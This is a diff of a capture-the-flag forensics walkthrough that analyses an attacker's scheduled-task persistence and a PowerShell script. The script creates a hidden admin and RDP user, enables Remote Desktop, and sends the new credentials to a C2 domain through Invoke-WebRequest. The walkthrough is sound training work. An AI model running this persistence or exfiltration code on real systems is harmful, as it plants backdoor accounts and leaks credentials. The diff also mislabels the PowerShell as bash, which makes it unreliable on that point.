@@ -177,7 +177,7 @@ Let's check the obvious possibilities first:
 
 Let's check our attacker history again; there is a cmd using SCHTASKS:
 
-```PowerShell
+```bash
 cmd.exe /Q /c schtasks /create /tn ""SysHelper Update"" /tr ""powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\Appdata\Local\JM.ps1"" /sc minute /mo 2 /ru SYSTEM /f 1> \\127.0.0.1\ADMIN$\__1756076432.886685 2>&1
 ```
 
@@ -195,13 +195,12 @@ As we saw just above, `jm.ps1`.
 
 Ok, let's go reverse the script `jm.ps1`:
 
-```PowerShell
+```bash
 cat JM.ps1 
 $usernames = @("svc_netupd", "svc_dns", "sys_helper", "WinTelemetry", "UpdaterSvc")
 $existing = $usernames | Where-Object {
     Get-LocalUser -Name $_ -ErrorAction SilentlyContinue
 }
-
 
 if (-not $existing) {
     $newUser = Get-Random -InputObject $usernames
@@ -223,17 +222,17 @@ The attacker was nice enough to leave us comments!
 
 So basically, this script does:
 1. Check if a username from a list exists:
-```PowerShell
+   
+```bash
 $usernames = @("svc_netupd", "svc_dns", "sys_helper", "WinTelemetry", "UpdaterSvc")
 $existing = $usernames | Where-Object {
     Get-LocalUser -Name $_ -ErrorAction SilentlyContinue
 }
 ```
 
-2. If not, it creates it and adds it to the Admin and RDP groups:
+1. If not, it creates it and adds it to the Admin and RDP groups:
 
-```PowerShell  
-
+```bash  
 if (-not $existing) {
     $newUser = Get-Random -InputObject $usernames
     $timestamp = (Get-Date).ToString("yyyyMMddHHmmss")
@@ -246,13 +245,13 @@ if (-not $existing) {
 ```
 
 3. Then, it allows RDP login:
-```PowerShell
+```bash
     Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
     Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 ```
 
 4. Finally, it sends the credential of the created user to the C2 with domain `NapoleonsBlackPearl`:
-```PowerShell
+```bash
     Invoke-WebRequest -Uri "[http://NapoleonsBlackPearl.htb/Exchange?data=$](http://NapoleonsBlackPearl.htb/Exchange?data=$)([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$newUser|$password")))" -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
 ```
 
@@ -260,7 +259,7 @@ So what user did the attacker create?
 
 Let's check out the possible usernames:
 
-```PowerShell
+```bash
 $usernames = @("svc_netupd", "svc_dns", "sys_helper", "WinTelemetry", "UpdaterSvc")
 ```
 
@@ -304,7 +303,7 @@ We do have some matches and the timestamp does match the execution of the Script
 ### What domain name did the attacker use for credential exfiltration? (domain)
 
 As seen already in the script:
-```PowerShell
+```bash
 Invoke-WebRequest -Uri "[http://NapoleonsBlackPearl.htb/Exchange?data=$](http://NapoleonsBlackPearl.htb/Exchange?data=$)([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$newUser|$password")))" -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
 ```
 > Answer is `NapoleonsBlackPearl`
@@ -312,7 +311,7 @@ Invoke-WebRequest -Uri "[http://NapoleonsBlackPearl.htb/Exchange?data=$](http://
 ### What password did the attacker’s script generate for the newly created user? (string)
 
 Let's check out the code that generates the password:
-```PowerShell
+```bash
     $timestamp = (Get-Date).ToString("yyyyMMddHHmmss")
     $password = "Watson_$timestamp"
 ```
@@ -425,7 +424,7 @@ The Registry key is from SYSTEM. Keep in mind that values `ControlSet001` and `C
 
 Let's check out the Admin PowerShell history in the file: `ConsoleHost_history.txt` provided by WAPP.
 
-```PowerShell
+```bash
 [...]
 auditpol /set /subcategory:"Process Creation" /success:enable
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
